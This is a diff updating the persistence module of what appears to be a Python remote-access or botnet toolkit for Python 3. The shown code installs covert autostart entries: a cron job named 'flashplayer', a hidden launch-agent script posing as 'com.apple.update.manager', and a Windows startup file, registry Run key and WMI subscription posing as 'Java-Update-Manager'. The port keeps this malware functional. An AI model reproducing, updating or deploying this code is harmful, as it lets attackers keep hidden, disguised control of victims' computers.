@@ -12,13 +12,13 @@ import subprocess
 
 # packages
 if sys.platform == 'win32':
-    import _winreg
+    import winreg
 
 # utilities
 import core.util as util
 
 # globals
-packages = ['_winreg'] if sys.platform == 'win32' else []
+packages = ['winreg'] if sys.platform == 'win32' else []
 platforms = ['win32','linux2','darwin']
 results = {}
 usage = 'persistence [method] <add/remove>'
@@ -136,13 +136,13 @@ def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
                     with open('/etc/crontab', 'r') as fp:
                         data = fp.read()
                     if task not in data:
-                        with file('/etc/crontab', 'a') as fd:
+                        with open('/etc/crontab', 'a') as fd:
                             fd.write('\n' + task + '\n')
                     return (True, path)
                 else:
                     return (True, path)
     except Exception as e:
-        util.log("{} error: {}".format(_add_crontab_job.func_name, str(e)))
+        util.log("{} error: {}".format(_add_crontab_job.__name__, str(e)))
     return (False, None)
 
 
@@ -162,7 +162,7 @@ def _add_launch_agent(value=None, name='com.apple.update.manager'):
                     os.makedirs('/var/tmp')
                 fpath   = '/var/tmp/.{}.sh'.format(name)
                 bash    = globals()['__Template_plist'].replace('__LABEL__', label).replace('__FILE__', value)
-                with file(fpath, 'w') as fileobj:
+                with open(fpath, 'w') as fileobj:
                     fileobj.write(bash)
                 bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                 time.sleep(1)
@@ -203,11 +203,11 @@ def _add_startup_file(value=None, name='Java-Update-Manager'):
                 startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
                 content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                 if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
-                    with file(startup_file, 'w') as fp:
+                    with open(startup_file, 'w') as fp:
                         fp.write(content)
                 return (True, startup_file)
     except Exception as e:
-        util.log('{} error: {}'.format(_add_startup_file.func_name, str(e)))
+        util.log('{} error: {}'.format(_add_startup_file.__name__, str(e)))
     return (False, None)
 
 
@@ -220,9 +220,9 @@ def _add_registry_key(value=None, name='Java-Update-Manager'):
                     util.registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", name, value)
                     return (True, name)
                 except Exception as e:
-                    util.log('{} error: {}'.format(_add_registry_key.func_name, str(e)))
+                    util.log('{} error: {}'.format(_add_registry_key.__name__, str(e)))
     except Exception as e:
-        util.log('{} error: {}'.format(_add_registry_key.func_name, str(e)))
+        util.log('{} error: {}'.format(_add_registry_key.__name__, str(e)))
     return (False, None)
 
 
@@ -244,7 +244,7 @@ def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
                 if name in result:
                     return (True, result)
     except Exception as e:
-        util.log('{} error: {}'.format(_add_powershell_wmi.func_name, str(e)))
+        util.log('{} error: {}'.format(_add_powershell_wmi.__name__, str(e)))
     return (False, None)
 
 
@@ -268,9 +268,9 @@ def _remove_hidden_file():
                     if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                         return (False, None)
                 except Exception as e1:
-                    util.log('{} error: {}'.format(_remove_hidden_file.func_name, str(e1)))
+                    util.log('{} error: {}'.format(_remove_hidden_file.__name__, str(e1)))
     except Exception as e2:
-        util.log('{} error: {}'.format(_remove_hidden_file.func_name, str(e2)))
+        util.log('{} error: {}'.format(_remove_hidden_file.__name__, str(e2)))
     return (methods['hidden_file'].established, methods['hidden_file'].result)
 
 
@@ -286,7 +286,7 @@ def _remove_crontab_job(value=None, name='flashplayer'):
                 fp.write('\n'.join(lines))
         return (False, None)
     except Exception as e:
-        util.log('{} error: {}'.format(_remove_crontab_job.func_name, str(e)))
+        util.log('{} error: {}'.format(_remove_crontab_job.__name__, str(e)))
     return (methods['hidden_file'].established, methods['hidden_file'].result)
 
 
@@ -298,7 +298,7 @@ def _remove_launch_agent(value=None, name='com.apple.update.manager'):
                 util.delete(launch_agent)
                 return (False, None)
     except Exception as e:
-        util.log("{} error: {}".format(_remove_launch_agent.func_name, str(e)))
+        util.log("{} error: {}".format(_remove_launch_agent.__name__, str(e)))
     return (methods['launch_agent'].established, methods['launch_agent'].result)
 
 
@@ -316,7 +316,7 @@ def _remove_powershell_wmi(value=None, name='Java-Update-Manager'):
             except: pass
         return (methods['powershell_wmi'].established, methods['powershell_wmi'].result)
     except Exception as e:
-        util.log('{} error: {}'.format(_add_powershell_wmi.func_name, str(e)))
+        util.log('{} error: {}'.format(_add_powershell_wmi.__name__, str(e)))
     return (methods['powershell_wmi'].established, methods['powershell_wmi'].result)
     
 
@@ -325,9 +325,9 @@ def _remove_registry_key(value=None, name='Java-Update-Manager'):
         if methods['registry_key'].established:
             value = methods['registry_key'].result
             try:
-                key = OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, _winreg.KEY_ALL_ACCESS)
-                _winreg.DeleteValue(key, name)
-                _winreg.CloseKey(key)
+                key = OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
+                winreg.DeleteValue(key, name)
+                winreg.CloseKey(key)
                 return (False, None)
             except: pass
         return (methods['registry_key'].established, methods['registry_key'].result)
@@ -349,7 +349,7 @@ def _remove_startup_file():
                     util.delete(startup_file)
         return (False, None)
     except Exception as e:
-        util.log('{} error: {}'.format(_remove_startup_file.func_name, str(e)))
+        util.log('{} error: {}'.format(_remove_startup_file.__name__, str(e)))
 
 hidden_file    = Method('hidden_file', platforms=['win32','linux2','darwin'])
 scheduled_task = Method('scheduled_task', platforms=['win32'])
